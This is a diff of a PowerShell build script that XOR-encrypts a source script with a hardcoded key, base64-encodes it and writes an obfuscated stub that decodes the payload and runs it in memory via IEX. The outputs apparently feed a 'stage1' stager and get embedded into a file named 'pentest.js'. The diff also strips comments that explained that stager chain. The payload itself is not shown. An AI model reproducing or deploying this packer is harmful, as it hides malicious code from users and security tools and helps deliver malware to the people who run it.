@@ -8,7 +8,7 @@ param(
     [string]$Out = 'killing_obf.ps1'
 )
 
-$KEY = 'snapec2_secret'                      # same key as stage1/build.ps1
+$KEY = 'snapec2_secret'
 $key = [Text.Encoding]::UTF8.GetBytes($KEY)
 
 if ([IO.Path]::IsPathRooted($Src)) { $srcPath = $Src } else { $srcPath = Join-Path $PSScriptRoot $Src }
@@ -21,7 +21,7 @@ for ($i = 0; $i -lt $ps.Length; $i++) {
 }
 $b64 = [Convert]::ToBase64String($enc)
 
-# key bytes XOR 0x5A (same trick as stage1 stager)
+# key bytes XOR 0x5A
 $kb = ($key | ForEach-Object { '0x{0:X2}' -f ($_ -bxor 0x5A) }) -join ','
 
 $stub = @"
@@ -39,7 +39,6 @@ IEX ([Text.Encoding]::UTF8.GetString(`$b))
 if ([IO.Path]::IsPathRooted($Out)) { $outPath = $Out } else { $outPath = Join-Path $PSScriptRoot $Out }
 [IO.File]::WriteAllText($outPath, $stub, [Text.Encoding]::UTF8)
 
-# also emit the raw blob for embedding (e.g. into pentest.js via stage1/build.ps1)
 $b64Path = Join-Path $PSScriptRoot 'killing.b64.txt'
 [IO.File]::WriteAllText($b64Path, $b64, [Text.Encoding]::UTF8)
 
